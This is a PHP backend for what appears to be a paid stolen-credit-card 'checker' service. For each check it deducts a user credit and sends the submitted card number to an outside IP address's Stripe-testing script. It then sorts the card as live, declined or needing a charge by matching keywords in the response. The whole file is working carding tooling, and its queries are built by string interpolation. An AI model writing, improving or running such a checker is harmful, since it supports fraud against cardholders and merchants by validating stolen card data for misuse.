<?php
include('../config.php');
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['user_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Not logged in']);
    exit();
}

$user_id = $_SESSION['user_id'];

// Fetch current credits
$sql = "SELECT username, credit, total_cc, usertype FROM users WHERE id = '$user_id' LIMIT 1";
$result = mysqli_query($conn, $sql);
$user = mysqli_fetch_assoc($result);

if (!$user || $user['credit'] <= 0) {
    echo json_encode(['status' => 'error', 'message' => 'No credits left']);
    exit();
}

// Deduct 1 credit
$update = "UPDATE users SET credit = credit - 1 WHERE id = '$user_id'";
mysqli_query($conn, $update);

if (isset($_POST['cc'])) {
    $cc = trim($_POST['cc']);
    $api_url = "http://137.184.155.22/stripe1.php?cc=" . urlencode($cc);

    $start = microtime(true);
    $response = @file_get_contents($api_url);
    $end = microtime(true);
    $time_taken = round($end - $start, 2) . 's';

    $decoded = json_decode($response, true);

    if (!$decoded || !isset($decoded['status'])) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid response from API',
            'raw' => $response
        ]);
        exit();
    }

    // Handle response fields
    $status_raw = strtolower($decoded['status']);
    $message_raw = strtolower($decoded['message'] ?? '');
    $approve_keywords = ['insufficient', 'thank', 'charged', 'approved', 'success', 'completed', 'live'];

    // Decision logic
    $final_status = 'DECLINE ❌';
    foreach ($approve_keywords as $word) {
        if (strpos($message_raw, $word) !== false || $status_raw === 'live') {
            $final_status = 'APPROVE ✅';
            break;
        }
    }

    if (strpos($message_raw, 'three_d_secure') !== false || strpos($message_raw, 'requires_action') !== false) {
        $final_status = 'Charge 1$';
    } elseif (strpos($message_raw, '3d') !== false || strpos($message_raw, 'authentication') !== false) {
        $final_status = 'APPROVE ✅';
    }

    echo json_encode([
        'status' => $final_status,
        'message' => $decoded['message'] ?? 'No message',
        'time' => $time_taken,
        'card' => $cc,
        'raw' => $response
    ]);

} else {
    echo json_encode([
        'status' => 'Invalid Request',
        'message' => 'No card provided.'
    ]);
}
?>
